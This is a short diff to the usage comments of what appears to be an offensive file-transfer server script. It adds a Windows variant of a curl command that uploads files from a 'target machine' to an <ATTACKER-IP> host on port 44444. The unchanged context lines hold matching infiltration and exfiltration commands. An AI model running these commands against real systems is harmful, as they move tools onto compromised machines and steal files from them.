@@ -19,6 +19,7 @@
 #  From the target machine:
 #  Infil file: curl -O http://<ATTACKER-IP>:44444/<FILENAME>
 #  Exfil file: curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>:44444/
+#  Exfil file for Windows: curl -F "file=@<FILENAME>" http://<ATTACKER-IP>:44444/
 # 
 #  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
 #  parameters to the command line.
